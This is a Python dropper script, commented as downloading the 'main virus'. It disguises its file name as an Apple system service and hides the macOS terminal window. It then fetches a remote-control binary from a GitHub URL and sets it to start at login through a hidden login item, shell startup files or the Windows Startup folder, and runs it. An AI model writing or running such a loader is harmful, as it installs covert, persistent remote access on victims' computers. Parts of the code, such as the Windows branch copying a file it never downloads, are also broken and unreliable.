from requests import get
from os.path import expanduser
from os import remove
from subprocess import Popen as subproc
from os import system, remove
from sys import platform
from random import shuffle

filename = ['user', 'core', 'dev', 'service', 'daemon']
shuffle(filename)
filename = "com.apple." + '.'.join(filename)
localfile = f"{expanduser('~')}/.{filename}"

try:
    remove(localfile)
except FileNotFoundError:
    pass

# download main virus
if platform == "darwin":
    system("osascript -e 'tell application \"System Events\" to set activeApp to name of first application process whose frontmost is true' -e 'set terminalEmulators to {\"Terminal\", \"iTerm\", \"Hyper\", \"Kitty\"}' -e 'repeat with termApp in terminalEmulators' -e 'if (activeApp contains termApp) then' -e 'tell application termApp to set currentWindow to front window' -e 'set visible of currentWindow to false' -e 'exit repeat' -e 'end if' -e 'end repeat'")
    open(localfile, 'wb').write(get("https://raw.githubusercontent.com/mrdog233o5/remote-control-discord/main/dist/main-mac", allow_redirects=True).content)
    system(f"osascript -e 'tell application \"System Events\" to make login item at end with properties {{path:\"{localfile}\", hidden:true}}' > /dev/null")
elif platform == "linux":
    from os import environ
    open(localfile, 'wb').write(get("https://raw.githubusercontent.com/mrdog233o5/remote-control-discord/main/dist/main-linux", allow_redirects=True).content)
    if 'zsh' in environ['SHELL']:
        system(f"echo {localfile} >> {expanduser('~')}/.zshenv")
    elif 'bash' in environ['SHELL']:
        system(f"echo {localfile} >> {expanduser('~')}/.bashenv")
elif platform == "win32":
    from shutil import copy
    copy(localfile ,"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp")

system(f"chmod 555 {localfile}")

subproc([localfile])
